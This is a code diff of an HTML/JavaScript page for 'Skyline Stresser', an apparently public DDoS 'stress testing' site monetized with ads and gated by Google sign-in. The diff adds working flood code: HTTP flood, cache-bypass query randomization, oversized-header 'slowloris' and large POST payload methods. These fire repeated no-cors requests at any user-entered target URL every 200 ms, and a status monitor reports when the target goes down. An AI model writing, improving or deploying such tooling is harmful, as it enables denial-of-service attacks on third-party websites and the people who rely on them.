@@ -3,16 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Skyline Stresser - Media.net Monetization</title>
+    <title>Skyline Stresser - Monetag Monetization</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
-    <!-- Media.net Script (Instant Setup - No Approval Needed) -->
-    <script>
-        window._mNHandle = window._mNHandle || {};
-        window._mNHandle.queue = window._mNHandle.queue || [];
-        medianet_versionId = "3121199";
+    <!-- Monetag Script -->
+    <script type="text/javascript">
+        (function(m,o,n,e,t,a,g){m['MonetagObject']=o;m[o]=m[o]||function(){
+        (m[o].q=m[o].q||[]).push(arguments)};a=o+'=';g=o+'=';a+='10446662';g+='5gvci.com';
+        t=o+'=';t+='10446662';e=document.createElement('script');
+        e.async=true;e.src='//static.mntg.io/mtag.js#'+a+g+t;
+        s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(e,s);
+        })('mntag','mntag',document,'script');
     </script>
-    <script src="https://contextual.media.net/nmedianet.js?cid=YOUR_MEDIA_NET_SITE_ID" async="async"></script>
 
     <style>
         :root {
@@ -43,7 +45,7 @@
             padding: 20px;
         }
 
-        /* Media.net Ad Styles */
+        /* Ad Container Styles */
         .ad-container {
             width: 100%;
             background: rgba(255, 255, 255, 0.05);
@@ -51,6 +53,7 @@
             padding: 15px;
             margin: 20px 0;
             border: 1px solid rgba(100, 100, 255, 0.2);
+            text-align: center;
         }
 
         .ad-header {
@@ -59,8 +62,8 @@
             font-size: 1.1em;
             display: flex;
             align-items: center;
-            gap: 8px;
             justify-content: center;
+            gap: 8px;
         }
 
         .container {
@@ -200,7 +203,8 @@
             color: var(--light);
         }
 
-        .input-group input {
+        .input-group input,
+        .input-group select {
             width: 100%;
             padding: 12px;
             background: rgba(20, 20, 35, 0.8);
@@ -208,6 +212,56 @@
             border-radius: 8px;
             color: var(--light);
             font-size: 1em;
+            transition: all 0.3s;
+        }
+
+        .input-group input:focus,
+        .input-group select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2);
+        }
+
+        .attack-methods {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .method-card {
+            background: rgba(30, 30, 45, 0.5);
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(100, 100, 255, 0.1);
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+
+        .method-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-2px);
+        }
+
+        .method-card.active {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-color: var(--primary);
+        }
+
+        .method-card i {
+            font-size: 1.5em;
+            margin-bottom: 10px;
+        }
+
+        .method-card h4 {
+            font-size: 0.9em;
+            font-weight: 600;
+        }
+
+        .method-card p {
+            font-size: 0.8em;
+            opacity: 0.8;
         }
 
         .btn {
@@ -222,7 +276,6 @@
             gap: 8px;
             width: 100%;
             justify-content: center;
-            margin-top: 10px;
         }
 
         .btn-primary {
@@ -230,9 +283,29 @@
             color: white;
         }
 
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(108, 92, 231, 0.4);
+        }
+
         .btn-danger {
             background: var(--danger);
             color: white;
+        }
+
+        .btn-danger:hover {
+            background: #b72727;
+            transform: translateY(-2px);
+        }
+
+        .btn-google {
+            background: #4285F4;
+            color: white;
+        }
+
+        .btn-google:hover {
+            background: #3367D6;
+            transform: translateY(-2px);
         }
 
         .stats {
@@ -247,6 +320,7 @@
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
             gap: 15px;
+            margin-bottom: 20px;
         }
 
         .stat-card {
@@ -260,11 +334,67 @@
             font-size: 0.9em;
             color: var(--light);
             margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
         .stat-card p {
             font-size: 1.8em;
             font-weight: 700;
+        }
+
+        .stat-card.success p {
+            color: var(--success);
+        }
+
+        .stat-card.danger p {
+            color: var(--danger);
+        }
+
+        .status-monitor {
+            background: rgba(30, 30, 45, 0.5);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(100, 100, 255, 0.1);
+            margin-top: 20px;
+        }
+
+        .status-monitor h3 {
+            margin-bottom: 15px;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px;
+            background: rgba(20, 20, 35, 0.8);
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+
+        .status-dot {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        .status-dot.online {
+            background: var(--success);
+        }
+
+        .status-dot.offline {
+            background: var(--danger);
+        }
+
+        .status-dot.checking {
+            background: var(--warning);
         }
 
         .log-container {
@@ -287,9 +417,48 @@
             align-items: center;
         }
 
+        .log-entry.success {
+            background: rgba(0, 184, 148, 0.1);
+            color: var(--success);
+        }
+
+        .log-entry.danger {
+            background: rgba(214, 48, 49, 0.1);
+            color: var(--danger);
+        }
+
         .log-entry.info {
             background: rgba(108, 92, 231, 0.1);
             color: var(--primary);
+        }
+
+        .log-entry.warning {
+            background: rgba(253, 203, 110, 0.1);
+            color: var(--warning);
+        }
+
+        .log-time {
+            opacity: 0.7;
+            font-size: 0.8em;
+        }
+
+        .progress-container {
+            margin-top: 20px;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: rgba(100, 100, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 5px;
+        }
+
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            width: 0%;
+            transition: width 0.3s;
         }
 
         .footer {
@@ -303,6 +472,14 @@
             .controls {
                 grid-template-columns: 1fr;
             }
+
+            .attack-methods {
+                grid-template-columns: 1fr;
+            }
+
+            .auth-buttons {
+                flex-direction: column;
+            }
         }
     </style>
 </head>
@@ -310,23 +487,25 @@
     <div class="container">
         <div class="header">
             <h1><i class="fas fa-bolt"></i> Skyline Stresser</h1>
-            <p>Premium Stress Testing with Media.net Monetization</p>
+            <p>Complete Stress Testing with Monetag Monetization</p>
         </div>
 
-        <!-- Media.net Ad - Top Leaderboard (728x90) -->
+        <!-- Monetag Ad Container - Top -->
         <div class="ad-container">
             <div class="ad-header"><i class="fas fa-star"></i> Sponsored Content</div>
-            <div id="YOUR_MEDIA_NET_SITE_ID_728x90_0"></div>
+            <div id="mntag_10446662"></div>
         </div>
 
         <div class="auth-section">
-            <h3><i class="fas fa-user-shield"></i> Authentication</h3>
-            <p>Sign in with Google to access premium tools</p>
+            <h3><i class="fas fa-user-shield"></i> Authentication Required</h3>
+            <p>Sign in with Google to access all features</p>
 
             <div id="authContainer">
-                <button class="btn btn-primary" id="googleSignIn">
-                    <i class="fab fa-google"></i> Sign in with Google
-                </button>
+                <div class="auth-buttons">
+                    <button class="btn btn-google" id="googleSignIn">
+                        <i class="fab fa-google"></i> Sign in with Google
+                    </button>
+                </div>
             </div>
 
             <div id="userContainer" style="display: none;">
@@ -349,87 +528,145 @@
 
                 <div class="input-group">
                     <label for="targetUrl">Target URL</label>
-                    <input type="text" id="targetUrl" placeholder="https://example.com" value="https://example.com">
+                    <input type="text" id="targetUrl" placeholder="https://www.example.com" value="https://example.com">
                 </div>
 
                 <div class="input-group">
                     <label for="threads">Threads</label>
-                    <input type="number" id="threads" min="1" max="20" value="5">
+                    <input type="number" id="threads" min="1" max="50" value="10">
                 </div>
 
-                <button class="btn btn-primary" id="startBtn">
-                    <i class="fas fa-play"></i> Start Test
-                </button>
-                <button class="btn btn-danger" id="stopBtn" disabled>
-                    <i class="fas fa-stop"></i> Stop Test
-                </button>
+                <div class="input-group">
+                    <label for="timeout">Request Timeout (ms)</label>
+                    <input type="number" id="timeout" min="100" max="10000" value="3000">
+                </div>
             </div>
 
             <div class="control-group">
-                <h3><i class="fas fa-fire"></i> Attack Methods</h3>
+                <h3><i class="fas fa-fire"></i> Attack Method</h3>
+
                 <div class="attack-methods">
                     <div class="method-card active" data-method="http-flood">
                         <i class="fas fa-globe"></i>
                         <h4>HTTP Flood</h4>
+                        <p>Standard GET/POST requests</p>
                     </div>
+
                     <div class="method-card" data-method="cache-bypass">
                         <i class="fas fa-sync-alt"></i>
                         <h4>Cache Bypass</h4>
+                        <p>Randomized query strings</p>
+                    </div>
+
+                    <div class="method-card" data-method="slowloris">
+                        <i class="fas fa-turtle"></i>
+                        <h4>Slowloris</h4>
+                        <p>Slow HTTP headers</p>
+                    </div>
+
+                    <div class="method-card" data-method="random-data">
+                        <i class="fas fa-random"></i>
+                        <h4>Random Data</h4>
+                        <p>Large random payloads</p>
                     </div>
                 </div>
+
+                <button class="btn btn-primary" id="startBtn">
+                    <i class="fas fa-play"></i> Launch Attack
+                </button>
+
+                <button class="btn btn-danger" id="stopBtn" disabled>
+                    <i class="fas fa-stop"></i> Stop Attack
+                </button>
             </div>
         </div>
 
-        <!-- Media.net Ad - Middle Rectangle (300x250) -->
+        <!-- Monetag Ad Container - Middle -->
         <div class="ad-container">
-            <div class="ad-header"><i class="fas fa-thumbs-up"></i> Recommended Tools</div>
-            <div id="YOUR_MEDIA_NET_SITE_ID_300x250_0"></div>
+            <div class="ad-header"><i class="fas fa-thumbs-up"></i> Recommended</div>
+            <div id="mntag_10446662_2"></div>
         </div>
 
         <div class="stats" id="statsSection" style="display: none;">
-            <h3><i class="fas fa-chart-line"></i> Statistics</h3>
+            <h3><i class="fas fa-chart-line"></i> Attack Statistics</h3>
+
             <div class="stats-grid">
-                <div class="stat-card">
+                <div class="stat-card success">
                     <h4><i class="fas fa-check-circle"></i> Successful</h4>
                     <p id="successCount">0</p>
                 </div>
-                <div class="stat-card">
+
+                <div class="stat-card danger">
                     <h4><i class="fas fa-times-circle"></i> Failed</h4>
                     <p id="failCount">0</p>
                 </div>
+
                 <div class="stat-card">
                     <h4><i class="fas fa-clock"></i> Duration</h4>
                     <p id="duration">0s</p>
                 </div>
+
                 <div class="stat-card">
                     <h4><i class="fas fa-tachometer-alt"></i> RPS</h4>
                     <p id="rps">0</p>
                 </div>
             </div>
+
+            <div class="status-monitor">
+                <h3><i class="fas fa-heartbeat"></i> Target Status Monitor</h3>
+
+                <div class="status-indicator">
+                    <div class="status-dot checking" id="statusDot"></div>
+                    <div>
+                        <h4 id="statusText">Checking target status...</h4>
+                        <p id="lastCheck">Never checked</p>
+                    </div>
+                </div>
+
+                <div class="progress-container">
+                    <p>Response Time: <span id="responseTime">0ms</span></p>
+                    <div class="progress-bar">
+                        <div class="progress" id="responseProgress"></div>
+                    </div>
+                </div>
+            </div>
         </div>
 
-        <!-- Media.net Ad - Bottom Banner (728x90) -->
+        <!-- Monetag Ad Container - Bottom -->
         <div class="ad-container">
-            <div class="ad-header"><i class="fas fa-rocket"></i> Popular Content</div>
-            <div id="YOUR_MEDIA_NET_SITE_ID_728x90_1"></div>
+            <div class="ad-header"><i class="fas fa-rocket"></i> Popular Tools</div>
+            <div id="mntag_10446662_3"></div>
         </div>
 
         <div class="log-container" id="logContainer">
             <div class="log-entry info">
                 <i class="fas fa-info-circle"></i>
-                <span>[00:00:00]</span>
-                <span>Media.net ads loaded - earning starts now!</span>
+                <span class="log-time">[00:00:00]</span>
+                <span>Monetag ads loaded - earning starts now!</span>
             </div>
         </div>
     </div>
 
     <div class="footer">
-        <p>Skyline Stresser | Premium Stress Testing | Powered by Media.net</p>
+        <p>Skyline Stresser | Complete Stress Testing Platform</p>
     </div>
 
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/12.7.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/12.7.0/firebase-auth-compat.js"></script>
+
+    <!-- Service Worker for Monetag -->
+    <script>
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', function() {
+                navigator.serviceWorker.register('/sw.js').then(function(registration) {
+                    console.log('ServiceWorker registration successful');
+                }, function(err) {
+                    console.log('ServiceWorker registration failed: ', err);
+                });
+            });
+        }
+    </script>
 
     <script>
         // Firebase configuration
@@ -449,6 +686,22 @@
         const provider = new firebase.auth.GoogleAuthProvider();
 
         // DOM Elements
+        const targetUrlInput = document.getElementById('targetUrl');
+        const threadsInput = document.getElementById('threads');
+        const timeoutInput = document.getElementById('timeout');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const methodCards = document.querySelectorAll('.method-card');
+        const logContainer = document.getElementById('logContainer');
+        const successCount = document.getElementById('successCount');
+        const failCount = document.getElementById('failCount');
+        const duration = document.getElementById('duration');
+        const rps = document.getElementById('rps');
+        const statusDot = document.getElementById('statusDot');
+        const statusText = document.getElementById('statusText');
+        const lastCheck = document.getElementById('lastCheck');
+        const responseTime = document.getElementById('responseTime');
+        const responseProgress = document.getElementById('responseProgress');
         const googleSignIn = document.getElementById('googleSignIn');
         const signOutBtn = document.getElementById('signOutBtn');
         const authContainer = document.getElementById('authContainer');
@@ -458,36 +711,39 @@
         const userAvatar = document.getElementById('userAvatar');
         const userName = document.getElementById('userName');
         const userEmail = document.getElementById('userEmail');
-        const logContainer = document.getElementById('logContainer');
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const methodCards = document.querySelectorAll('.method-card');
-        const targetUrlInput = document.getElementById('targetUrl');
-        const threadsInput = document.getElementById('threads');
-        const successCount = document.getElementById('successCount');
-        const failCount = document.getElementById('failCount');
-        const duration = document.getElementById('duration');
-        const rps = document.getElementById('rps');
 
-        // State variables
+        // Attack state
         let attackActive = false;
+        let attackInterval;
+        let statusCheckInterval;
         let startTime;
         let requestCount = 0;
         let successRequests = 0;
         let failedRequests = 0;
         let currentMethod = 'http-flood';
-        let attackInterval;
+        let abortController = new AbortController();
+        let currentUser = null;
 
         // Log function
         function log(message, type = 'info') {
             const time = new Date().toLocaleTimeString();
             const logEntry = document.createElement('div');
             logEntry.className = `log-entry ${type}`;
+
+            let icon;
+            switch(type) {
+                case 'success': icon = 'fas fa-check-circle'; break;
+                case 'danger': icon = 'fas fa-times-circle'; break;
+                case 'warning': icon = 'fas fa-exclamation-triangle'; break;
+                default: icon = 'fas fa-info-circle';
+            }
+
             logEntry.innerHTML = `
-                <i class="fas fa-info-circle"></i>
-                <span>${time}</span>
+                <i class="${icon}"></i>
+                <span class="log-time">[${time}]</span>
                 <span>${message}</span>
             `;
+
             logContainer.appendChild(logEntry);
             logContainer.scrollTop = logContainer.scrollHeight;
         }
@@ -496,36 +752,61 @@
         googleSignIn.addEventListener('click', () => {
             auth.signInWithPopup(provider)
                 .then((result) => {
-                    const user = result.user;
-                    authContainer.style.display = 'none';
-                    userContainer.style.display = 'block';
-                    controlsSection.style.display = 'grid';
-                    statsSection.style.display = 'block';
-
-                    userName.textContent = user.displayName || 'User';
-                    userEmail.textContent = user.email;
-                    if (user.photoURL) {
-                        userAvatar.innerHTML = `<img src="${user.photoURL}" alt="User">`;
-                    } else {
-                        userAvatar.textContent = (user.displayName || 'U').charAt(0);
-                    }
-
-                    log(`Signed in as ${user.displayName || user.email}`);
+                    currentUser = result.user;
+                    log(`Successfully signed in as ${currentUser.displayName || currentUser.email}`, 'success');
+                    updateUI();
                 })
                 .catch((error) => {
-                    log(`Sign in error: ${error.message}`, 'danger');
+                    log(`Sign in failed: ${error.message}`, 'danger');
                 });
         });
 
         // Sign Out
         signOutBtn.addEventListener('click', () => {
-            auth.signOut().then(() => {
+            auth.signOut()
+                .then(() => {
+                    currentUser = null;
+                    log('Successfully signed out', 'info');
+                    updateUI();
+                })
+                .catch((error) => {
+                    log(`Sign out failed: ${error.message}`, 'danger');
+                });
+        });
+
+        // Update UI based on auth state
+        function updateUI() {
+            if (currentUser) {
+                authContainer.style.display = 'none';
+                userContainer.style.display = 'block';
+                controlsSection.style.display = 'grid';
+                statsSection.style.display = 'block';
+
+                userName.textContent = currentUser.displayName || 'User';
+                userEmail.textContent = currentUser.email;
+                if (currentUser.photoURL) {
+                    userAvatar.innerHTML = `<img src="${currentUser.photoURL}" alt="User">`;
+                } else {
+                    userAvatar.textContent = (currentUser.displayName || 'U').charAt(0).toUpperCase();
+                }
+            } else {
                 authContainer.style.display = 'block';
                 userContainer.style.display = 'none';
                 controlsSection.style.display = 'none';
                 statsSection.style.display = 'none';
-                log('Signed out');
-            });
+            }
+        }
+
+        // Auth state observer
+        auth.onAuthStateChanged((user) => {
+            if (user) {
+                currentUser = user;
+                updateUI();
+                log(`Welcome back, ${user.displayName || user.email}!`, 'success');
+            } else {
+                currentUser = null;
+                updateUI();
+            }
         });
 
         // Select attack method
@@ -534,55 +815,17 @@
                 methodCards.forEach(c => c.classList.remove('active'));
                 card.classList.add('active');
                 currentMethod = card.getAttribute('data-method');
-                log(`Method: ${card.querySelector('h4').textContent}`);
+                log(`Attack method changed to: ${card.querySelector('h4').textContent}`, 'info');
             });
         });
 
         // Start attack
-        startBtn.addEventListener('click', () => {
-            if (attackActive) return;
-
-            attackActive = true;
-            startTime = Date.now();
-            requestCount = 0;
-            successRequests = 0;
-            failedRequests = 0;
-
-            startBtn.disabled = true;
-            stopBtn.disabled = false;
-
-            log(`Starting ${currentMethod} attack on ${targetUrlInput.value}`);
-
-            attackInterval = setInterval(() => {
-                const url = targetUrlInput.value;
-                const threads = parseInt(threadsInput.value);
-
-                for (let i = 0; i < threads; i++) {
-                    fetch(url, { method: 'GET', mode: 'no-cors' })
-                        .then(() => {
-                            successRequests++;
-                            updateStats();
-                        })
-                        .catch(() => {
-                            failedRequests++;
-                            updateStats();
-                        });
-                }
-
-                requestCount += threads;
-            }, 200);
-        });
+        startBtn.addEventListener('click', startAttack);
 
         // Stop attack
-        stopBtn.addEventListener('click', () => {
-            attackActive = false;
-            clearInterval(attackInterval);
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
-            log('Attack stopped');
-        });
+        stopBtn.addEventListener('click', stopAttack);
 
-        // Update stats
+        // Update statistics
         function updateStats() {
             const now = Date.now();
             const elapsed = Math.floor((now - startTime) / 1000);
@@ -594,8 +837,199 @@
             failCount.textContent = failedRequests;
         }
 
+        // Check target status
+        async function checkTargetStatus() {
+            const url = targetUrlInput.value;
+            const start = Date.now();
+
+            try {
+                statusDot.className = 'status-dot checking';
+                statusText.textContent = 'Checking target status...';
+                lastCheck.textContent = 'Checking...';
+
+                const response = await fetch(url, {
+                    method: 'HEAD',
+                    mode: 'no-cors',
+                    cache: 'no-store',
+                    signal: abortController.signal
+                });
+
+                const responseTimeMs = Date.now() - start;
+                const isOnline = response.ok || response.type === 'opaque';
+
+                if (isOnline) {
+                    statusDot.className = 'status-dot online';
+                    statusText.textContent = 'Target is online';
+                    responseTime.textContent = `${responseTimeMs}ms`;
+                    const progress = Math.min(100, responseTimeMs / 100);
+                    responseProgress.style.width = `${progress}%`;
+                } else {
+                    statusDot.className = 'status-dot offline';
+                    statusText.textContent = 'Target appears to be down!';
+                    responseTime.textContent = 'N/A';
+                    responseProgress.style.width = '100%';
+                }
+
+                lastCheck.textContent = `Last checked: ${new Date().toLocaleTimeString()}`;
+            } catch (error) {
+                if (error.name === 'AbortError') {
+                    statusDot.className = 'status-dot offline';
+                    statusText.textContent = 'Status check aborted';
+                    responseTime.textContent = 'N/A';
+                    lastCheck.textContent = `Last checked: ${new Date().toLocaleTimeString()}`;
+                    responseProgress.style.width = '0%';
+                } else {
+                    statusDot.className = 'status-dot offline';
+                    statusText.textContent = 'Target is offline or unreachable';
+                    responseTime.textContent = 'N/A';
+                    lastCheck.textContent = `Last checked: ${new Date().toLocaleTimeString()}`;
+                    responseProgress.style.width = '100%';
+                    log(`Status check failed: ${error.message}`, 'danger');
+                }
+            }
+        }
+
+        // Attack methods
+        async function performAttack() {
+            const url = targetUrlInput.value;
+            const threads = parseInt(threadsInput.value);
+            const timeout = parseInt(timeoutInput.value);
+
+            const controller = new AbortController();
+
+            for (let i = 0; i < threads; i++) {
+                if (!attackActive) {
+                    controller.abort();
+                    break;
+                }
+
+                try {
+                    let attackUrl = url;
+                    let options = {
+                        method: 'GET',
+                        mode: 'no-cors',
+                        cache: 'no-store',
+                        signal: controller.signal
+                    };
+
+                    // Apply attack method
+                    switch(currentMethod) {
+                        case 'cache-bypass':
+                            attackUrl = `${url}?cb=${Math.random().toString(36).substring(2, 8)}&t=${Date.now()}`;
+                            break;
+
+                        case 'slowloris':
+                            options.headers = {
+                                'X-Test-Header': 'x'.repeat(1000),
+                                'X-Random': Math.random().toString(36).substring(2, 8)
+                            };
+                            break;
+
+                        case 'random-data':
+                            options.method = 'POST';
+                            options.body = JSON.stringify({
+                                test: 'x'.repeat(1000),
+                                time: Date.now()
+                            });
+                            options.headers = {
+                                'Content-Type': 'application/json'
+                            };
+                            break;
+                    }
+
+                    const timeoutId = setTimeout(() => controller.abort(), timeout);
+
+                    const response = await fetch(attackUrl, options);
+
+                    clearTimeout(timeoutId);
+
+                    if (response.ok || response.type === 'opaque') {
+                        successRequests++;
+                        log(`[Thread ${i+1}] Request successful (${currentMethod})`, 'success');
+                    } else {
+                        failedRequests++;
+                        log(`[Thread ${i+1}] Request failed: ${response.status}`, 'danger');
+                    }
+                } catch (error) {
+                    if (error.name !== 'AbortError') {
+                        failedRequests++;
+                        log(`[Thread ${i+1}] Request error: ${error.message}`, 'danger');
+                    }
+                }
+
+                requestCount++;
+                updateStats();
+            }
+        }
+
+        // Start attack
+        function startAttack() {
+            if (!currentUser) {
+                log('Please sign in first', 'warning');
+                return;
+            }
+
+            if (attackActive) {
+                log('Attack is already in progress!', 'warning');
+                return;
+            }
+
+            const url = targetUrlInput.value;
+            if (!url) {
+                log('Please enter a target URL', 'danger');
+                return;
+            }
+
+            // Reset abort controller
+            abortController = new AbortController();
+
+            attackActive = true;
+            startTime = Date.now();
+            requestCount = 0;
+            successRequests = 0;
+            failedRequests = 0;
+
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+
+            log(`Launching ${currentMethod} attack on ${url}`, 'info');
+
+            // Start status monitoring
+            statusCheckInterval = setInterval(checkTargetStatus, 5000);
+            checkTargetStatus();
+
+            // Start attack loop
+            attackInterval = setInterval(performAttack, 200);
+        }
+
+        // Stop attack
+        function stopAttack() {
+            if (!attackActive) return;
+
+            attackActive = false;
+
+            // Abort all ongoing requests
+            abortController.abort();
+
+            // Clear intervals
+            clearInterval(attackInterval);
+            clearInterval(statusCheckInterval);
+
+            // Update UI
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+
+            log('Attack stopped by user. All requests aborted.', 'warning');
+
+            // Update status
+            statusDot.className = 'status-dot offline';
+            statusText.textContent = 'Attack stopped';
+            responseTime.textContent = 'N/A';
+            responseProgress.style.width = '0%';
+        }
+
         // Initialize
-        log('System ready - Media.net ads active!');
+        log('Skyline Stresser initialized with Monetag monetization.', 'success');
     </script>
 </body>
 </html>
